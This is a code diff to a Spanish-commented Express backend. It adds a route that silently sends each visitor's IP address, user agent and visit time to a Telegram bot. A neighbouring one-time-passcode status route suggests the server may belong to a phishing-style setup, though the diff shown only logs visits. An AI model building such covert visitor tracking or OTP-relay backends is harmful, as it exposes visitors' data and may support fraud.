@@ -252,6 +252,41 @@ app.get('/api/otp-status/:requestId', (req, res) => {
     res.json({ status: request.status });
 });
 
+// ==========================================
+// NUEVA RUTA: NOTIFICAR VISITA A TELEGRAM
+// ==========================================
+app.post('/api/notify-visit', async (req, res) => {
+    // 1. Obtener la IP (Render usa proxies)
+    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    if (ip && ip.includes(',')) ip = ip.split(',')[0].trim();
+    
+    // 2. Obtener datos del navegador
+    const userAgent = req.headers['user-agent'] || 'Desconocido';
+    
+    // 3. Obtener la hora actual (Colombia)
+    const now = new Date();
+    const dateStr = now.toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+
+    // 4. Construir el mensaje
+    let text = `<b>🌐 NUEVA VISITA AL INDEX</b>\n\n`;
+    text += `<b>📅 Fecha:</b> ${dateStr}\n`;
+    text += `<b>📡 IP:</b> <code>${ip}</code>\n`;
+    text += `<b>💻 Navegador:</b> ${userAgent.substring(0, 60)}...\n`;
+
+    try {
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: 'HTML'
+        });
+        console.log(`✅ Notificación de visita enviada. IP: ${ip}`);
+        res.status(200).json({ success: true });
+    } catch (error) {
+        console.error("❌ Error enviando notificación de visita:", error.response?.data || error.message);
+        res.status(500).json({ error: "Error enviando notificación" });
+    }
+});
+
 // Ruta de salud
 app.get('/', (req, res) => {
     res.send('Backend funcionando correctamente.');
